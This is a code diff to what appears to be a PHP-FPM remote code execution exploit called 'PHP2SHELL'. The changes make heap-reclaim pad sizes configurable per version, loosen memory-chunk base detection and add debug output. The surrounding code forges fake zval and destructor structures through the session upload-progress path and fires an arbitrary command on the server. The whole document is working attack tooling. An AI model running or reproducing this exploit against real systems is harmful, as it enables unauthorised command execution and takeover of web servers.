@@ -256,8 +256,10 @@ class Oracle:
 
     def chunk_base(self, addr: int) -> int | None:
         for start, end, perms in self.maps:
-            if start <= addr < end and "rw-p" in perms and end - start == MEM_CHUNK:
-                return start
+            if start <= addr < end and "rw-p" in perms and end - start >= MEM_CHUNK:
+                base = addr & ~(MEM_CHUNK - 1)
+                if start <= base and base + MEM_CHUNK <= end:
+                    return base
         return None
 
     def refresh(self) -> None:
@@ -325,9 +327,22 @@ def _arm_stale(base: Target, builder: Target, oracle: Oracle, size: int) -> int:
     return d
 
 
+def _reclaim_pads(version: str) -> list[int]:
+    path = os.path.join(ROOT, "profiles", f"{version}-fpm.json")
+    try:
+        with open(path, encoding="utf-8") as handle:
+            return [int(x) for x in
+                    json.load(handle)["fpm"].get("reclaim_pads",
+                                                 [4096, 4096, 4096])]
+    except (OSError, KeyError, TypeError, ValueError):
+        return [4096, 4096, 4096]
+
+
 def _probe_cover(chain404: Target, oracle: Oracle, d: int, need: int,
-                 size: int = 12288) -> int | None:
-    """Land a patterned reclaim buffer (3x4096 pads + one big field) over d
+                 size: int = 12288,
+                 pads: list[int] | tuple[int, ...] = (4096, 4096, 4096)
+                 ) -> int | None:
+    """Land a patterned reclaim buffer (pads + one big field) over d
     against a 404 endpoint, scan the mem chunk for the unique marker, and
     return the content offset K such that buffer+K == d."""
     chunk = oracle.chunk_base(d)
@@ -338,7 +353,8 @@ def _probe_cover(chain404: Target, oracle: Oracle, d: int, need: int,
     marker = b"MK" + os.urandom(6)
     content = bytearray(b"\x00" * size)
     content[0:8] = marker
-    parts = [{"name": f"pad{i}", "data": b"C" * 4096} for i in range(3)]
+    parts = [{"name": f"pad{i}", "data": b"C" * pad}
+             for i, pad in enumerate(pads)]
     parts.append({"name": "big", "data": bytes(content)})
     chain404.post_multipart(parts, b"PRBLAND1")
     oracle.refresh()
@@ -352,6 +368,10 @@ def _probe_cover(chain404: Target, oracle: Oracle, d: int, need: int,
         idx = pos + 1
     d_off = d - chunk
     cover = [h for h in hits if h <= d_off and d_off + need <= h + size]
+    if os.environ.get("PHP2SHELL_DEBUG"):
+        print(f"[debug] d={d:#x} chunk={chunk:#x} d_off={d_off:#x} "
+              f"need={need:#x} size={size:#x} hits={[hex(h) for h in hits]} "
+              f"cover={[hex(h) for h in cover]}")
     if not cover:
         print(f"[!] no covering reclaim buffer (hits={[hex(h) for h in hits]})")
         return None
@@ -368,13 +388,16 @@ def _rebuild_ref_and_arm(base: Target, builder: Target, oracle: Oracle,
     return _arm_stale(base, builder, oracle, oom_size)
 
 
-def _consume_b(chainapp: Target, forged: bytes) -> tuple[int, dict[str, str], bytes]:
+def _consume_b(chainapp: Target, forged: bytes,
+               pads: list[int] | tuple[int, ...] = (4096, 4096, 4096)
+               ) -> tuple[int, dict[str, str], bytes]:
     """Consume with the forged reclaim buffer.
 
     Consumer B MUST carry the PHP_SESSION_UPLOAD_PROGRESS field and a file
     part: rfc1867 has to fire the pre-RINIT session_start, otherwise the
     decode would run post-RINIT against a memset BG(unserialize)."""
-    parts = [{"name": f"pad{i}", "data": b"C" * 4096} for i in range(3)]
+    parts = [{"name": f"pad{i}", "data": b"C" * pad}
+             for i, pad in enumerate(pads)]
     parts.append({"name": "big", "data": forged})
     parts.append({"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"})
     parts.append({"name": "f", "filename": "a.txt", "data": b"x" * 8})
@@ -560,12 +583,13 @@ def cmd_primitive(args) -> int:
     chainapp = Target(args.base + "/app.php")
     builder = Target(args.builder)
     oracle = Oracle(args.version)
+    pads = _reclaim_pads(args.version)
     size, need = 16384, 0x440
 
     for _attempt in range(4):
         try:
             d = _arm_stale(base, builder, oracle, args.size)
-            k = _probe_cover(chain404, oracle, d, need, size)
+            k = _probe_cover(chain404, oracle, d, need, size, pads)
             if k is None:
                 return 1
             d2 = _rebuild_ref_and_arm(base, builder, oracle, args.size)
@@ -592,7 +616,7 @@ def cmd_primitive(args) -> int:
         struct.pack_into("<I", forged, k + 0x308, 4)         # IS_LONG
         struct.pack_into("<q", forged, k + 0x400, 0)         # fake dtor used_slots
 
-        status, _h, body = _consume_b(chainapp, bytes(forged))
+        status, _h, body = _consume_b(chainapp, bytes(forged), pads)
         text = body.decode("latin1", "replace")
         print(f"    body: {text[:300]!r}")
         needle = str(args.value).encode()
@@ -707,6 +731,7 @@ def cmd_endgame(args) -> int:
     chainapp = Target(args.base + "/app.php")
     builder = Target(args.builder)
     oracle = Oracle(args.version)
+    pads = _reclaim_pads(args.version)
     size, need = 12288, 0x900
 
     local_proof = os.path.join(LAB, "webroot", proof)
@@ -717,7 +742,7 @@ def cmd_endgame(args) -> int:
     for _attempt in range(4):
         try:
             d = _arm_stale(base, builder, oracle, args.size)
-            k = _probe_cover(chain404, oracle, d, need, size)
+            k = _probe_cover(chain404, oracle, d, need, size, pads)
             if k is None:
                 print("[*] probe found no cover; "
                       "falling back to the two-slot no-oracle geometry")
@@ -739,7 +764,7 @@ def cmd_endgame(args) -> int:
             continue
         forged = _build_endgame_payload(d, k, size, oracle.zif, command)
 
-        status, _h, _body = _consume_b(chainapp, forged)
+        status, _h, _body = _consume_b(chainapp, forged, pads)
         print(f"[*] command {command!r} fired (status={status}); waiting for "
               f"worker respawn ...")
         break
@@ -933,8 +958,10 @@ def _local_bases(version: str) -> tuple[int, int]:
             if (len(parts) >= 6 and parts[-1] == exe
                     and (pie is None or start < pie)):
                 pie = start
-            if chunk is None and "rw-p" in parts[1] and end - start == MEM_CHUNK:
-                chunk = start
+            if chunk is None and "rw-p" in parts[1] and end - start >= MEM_CHUNK:
+                base = (start + MEM_CHUNK - 1) & ~(MEM_CHUNK - 1)
+                if base + MEM_CHUNK <= end:
+                    chunk = base
     if pie is None or chunk is None:
         raise RuntimeError("could not derive PIE/chunk bases from maps")
     return pie, chunk
@@ -1020,7 +1047,7 @@ def cmd_no_oracle(args) -> int:
         big_session_post(builder, OOM_SID, args.size)
         producer_get(base, OOM_SID)
         forged = _build_endgame_payload(d, k, size, zif, command)
-        status, _h, _b = _consume_b(chainapp, forged)
+        status, _h, _b = _consume_b(chainapp, forged, pads)
         print(f"[*] attempt {attempt}: d=0x{d:x} k=0x{k:x} status={status}")
         for _ in range(4):
             time.sleep(0.35)
